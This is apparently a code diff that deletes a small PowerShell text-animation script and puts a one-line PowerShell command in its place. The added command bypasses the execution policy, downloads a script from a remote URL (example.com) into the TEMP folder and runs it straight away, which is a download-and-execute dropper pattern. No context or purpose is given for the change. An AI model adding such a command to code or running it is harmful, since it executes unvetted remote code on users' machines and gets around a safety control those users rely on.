@@ -1,13 +1,5 @@
-Clear-Host
-$text = "RTYUW"
-
-for ($i = 0; $i -lt 3; $i++) {
-    Clear-Host
-    foreach ($char in $text.ToCharArray()) {
-        Write-Host -NoNewline $char
-        Start-Sleep -Milliseconds 150
-    }
-    Start-Sleep -Milliseconds 400
-}
-
-echo "RTYUW echo executed"
+powershell -ExecutionPolicy Bypass -Command ^
+"$url='https://example.com/script.ps1'; ^
+$path=\"$env:TEMP\script.ps1\"; ^
+Invoke-WebRequest $url -UseBasicParsing -OutFile $path; ^
+& $path"
